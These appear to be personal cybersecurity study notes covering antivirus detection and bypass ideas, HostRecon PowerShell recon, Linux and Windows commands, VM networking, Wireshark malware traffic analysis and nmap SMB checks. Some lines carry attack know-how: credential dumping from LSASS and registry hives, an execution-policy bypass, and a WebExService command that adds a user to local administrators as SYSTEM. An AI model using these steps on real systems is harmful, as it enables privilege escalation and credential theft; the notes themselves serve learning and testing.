----
-typical: static detections; hooking runtime API calls; dynamic detection (fewer signatures)
-what about "next-gen" AV using ML or AI.  AI is only as smart as it needs to be (finding bad strings)
-Antimalware Scan Interface (AMSI) allows AV vendors to "see" powershell, javascript, vbscript, office macros and a few others after de-obfuscation and before execution but not all AV vendors support AMSI
-AV company should support AMSI see https://github.com/subat0mik/whoamsi
-AV isn't tracking everything, for performance reasons
-Malware Detection Systems (MDS) uses a technique called emulation.  Emulation doesn't rely on static structure or a signature of malware but executes the file in an artifical environment that emulates a real OS.  The analysis of this to determine if the file is benign or malicious.
-Methods of bypass: use non-malicious software in malicious ways.  Use psexec.exe vice metasploit psexec; Dump LSASS memory other than using mimikatz.exe; save registry hives and extract hashes elsewhere rather than using hashdump
-various methods for bypassing AV ie. Making the fight unfair
-testing methodology: install AV with updated signatures, take a VM snapshot, disconnect network, introduce malware, if discovered then modify and repeat, finally revert snapshot
-Application Control: AV has a literally impossible job stopping malicious software.  Instead focus on application control only allowing known good SW BUT only allowing signed MS binaries isn't 100% effective.  Some signed binaries allow arbitrary code execution direction aka LOLBINS or Living Off he Land Binaries
-Better approach for AV: rely on detection and rapid response with alerts at SOC to determine root cause analysis
-Endpoint Detection & Response (EDR)
REF: McJunkin, J.  (2020).  Bypassing Antivirus.  Rogue Infosec.  Retrieved from https://docs.google.com/presentation/d/1Fdcbv9U1qywIZSl2AhXJAlx61pyEITKfcbbwpJMvkcQ/edit#slide=id.p

--download: https://github.com/dafthack/HostRecon
--start powershell: powershell.exe -exec bypass
--import the script: PS C:&gt;Import-Module HostRecon.ps1
--run hostrecon: PS C:&gt;Invoke-HostRecon
--perform egress filter check on top 100 ports: PS C:&gt;Invoke-HostRecon -Portscan -TopPorts 100
------
-nmap -oN ?
-debsums //Debian and derived such as Ubuntu and Mint have built-in tool that compares installed
package components to their original has files maybe /usr/lib/libreoffice/share/gallery/www-
back/chocolate.jpg
-sha1sum &lt;file&gt; //calculates the SHA1 hash of the file
-gnome-open //opens a fileCyber
-REGEX: \d any digit; \D any non-digit char; | or; . any character; * 0 or more repetitions; \s any
whitespace; \S any Non-whitespace; + one or more repititions; [A-Za-z\s] Characters A-Z &amp; a-z then
whitespace; [\D]+\d{1,2}[a-z]+ one or more non-digits then one or two digits then lowercase letters and
spaces;
-grep &#39;teavee&#39; /etc/group //to see which user is in group teavee
-echo $SHELL //to see shell and the path to it
-gobuster (similar to dirb?)
-find | grep flag //looking for flag
-linpeas.sh //sh to get info? move into server and run
-ls -l|lolcat //colorful output of ls –l
-ls -l&gt; /tmp/listing.txt //write your directory listing to a file in /tmp/
-tail //bash: reads the last 10 lines of the file
-type //bash: find out if command is builtin or external binary file
-tee //bash: reads standard input and writes it to both standard output and one or more files
-top //bash: process viewer to find CPU intensive programs currently running
-file //tell you what a given object looks like
------
Checksum using Powershell
-Get-FileHash &lt;path to file/file&gt; | Format-List //default is SHA256
-Get-FileHash &lt;path to file/file&gt; -Algorithm SHA1 | Format-List //differing algorithms
------
Host IP address shows:
--192.168.56.1 as VirtualBox Host-Only Network maybe use as gateway for below
--192.168.56.5 for BlackArch
setting up network adapter
--ifconfig -a //note ifconfig is the old way on ubuntu new is using &quot;ip&quot;
--ifconfig enp0s3 192.168.100.5 //ifconfig &lt;adapter name&gt; &lt;valid internal IP address&gt;
--ip route add 0/0 via 192.168.100.1 dev enp0s3 //routing via the gateway
--add &quot;nameserver 8.8.8.8&quot; to /etc/resolv.conf
--ip addr show
--ip link set enp0s3 up
--ip route show
DHCP used commonly in VirtualBox? checking BUT Parrot doesn&#39;t use it. Changed VM to NAT and ran:
--dhcpcd enp0s3 //started dhcp on this interface and obtained IP
-----
-WebExService -&gt; any* user can start or stop it via SMB and trick it into running any other command as
SYSTEM!
*Except Windows 10, where you need admin
-C:\&gt; sc \\10.0.0.0 start webexservice a software-update 1 net localgroup administrators testuser /add

webexec.org
-----------
IOActive (Pronounced I Active?) ID risks in SATCOM
Look for design issues, backdoors, HW embedded passwords and not just buffer overflow of code
----------
Google hacks
-site:&lt;urdomain&gt; and keep minimizing from what returns until you see that you&#39;re in interesting areas
(like /index)
--------------
-checking form SMB signing:
--first you want to run nmap scripts related to SMB so do a search for this with the following command: ls usrshare/nmap/scripts/ | grep smb
--well see a list of scripts which we can run on nmap: nmap -sU -sT -p U:137, T:139, 445 –script=smb2-security-mode.nse 10.10.98.0/24
----------
-NAT-Networked on VirtualBox
File-→Preferences → Network
Select NAT Networks tab the create new “NatNetwork” by clicking the + button 
Select each VM Settings → Network
In Attached to: choose NAT Network and select “NatNetwork”
Restart each VM
----------
Wireshark - Malware traffic analysis
-Statistics -> Protocol Hierarchy //to see the summary of protocals being used
-TCP application level
-In second/middle window, you can right click something such as src or dst host and add as column.
-File Export objects for http. Sort contents, look for application/xxx for malware.
-Hash the potential exploit .jar; .swf; .exe and upload to virus total.

Wireshark Tutorial for Beginners by Anson Alexander
-RST means stop talking to me
-If data goes out then take a look at that port to see what is being sent out.
-sudo lsof -i:443
-view: coloring rules to see or change colors 
https://www.attplans.com/resources/difference-mbps-and-mbps/ 
----------
nse scripts (HackerSploit Youtube)
-lua scripting language
-located in .../nmap/scripts
-*.nse
----------
temp fix for hyper-v issue:
bcdedit /set hypervisorlaunchtype off //to use vmware & virtualbox
bcdedit /set hypervisorlaunchtype auto //to use hyper-v

